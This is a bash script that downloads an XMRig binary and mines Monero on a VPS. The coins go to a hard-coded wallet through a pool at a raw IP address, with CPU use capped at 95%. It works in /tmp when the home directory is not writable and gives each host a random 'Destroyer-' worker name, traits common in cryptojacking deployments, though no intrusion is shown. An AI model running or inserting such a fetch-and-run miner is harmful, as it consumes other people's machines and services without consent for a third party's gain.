#!/bin/bash

WALLET="49zBKSwwzERho5ESFGZ3WBXjT6Pdgi92QJ2V8wYF26AAeoKWrrbuB5P7bDEPCM4TjnAzS5GU9bMvg5pUgT99J3f3EURo6H8"
POOL="31.97.58.247:1122"
WORKER="Destroyer-$(tr -dc A-Za-z0-9 </dev/urandom | head -c 6)"

echo "[+] Starting XMRig on Valtr VPS..."
echo "[+] Worker Name: $WORKER"

# Create work directory in /tmp if no permission in home
WORKDIR="/tmp/xmrig_valtr"
mkdir -p $WORKDIR && cd $WORKDIR

# Download prebuilt xmrig binary
if [ ! -f "$WORKDIR/xmrig" ]; then
    echo "[+] Downloading prebuilt XMRig binary..."
    curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz
    tar -xvf xmrig.tar.gz
    mv xmrig-6.21.1/xmrig ./
    chmod +x xmrig
    rm -rf xmrig-6.21.1 xmrig.tar.gz
fi

# Start mining
./xmrig -o $POOL -u $WALLET -p $WORKER \
  --coin monero -k --tls=false --donate-level=1 \
  --max-cpu-usage=95 --randomx-1gb-pages

# Show CPU info
echo "[i] CPU Info:"
lscpu | grep -E 'Model name|Socket|Thread|CPU\(s\)'

echo "[+] Mining started efficiently on Valtr VPS!"
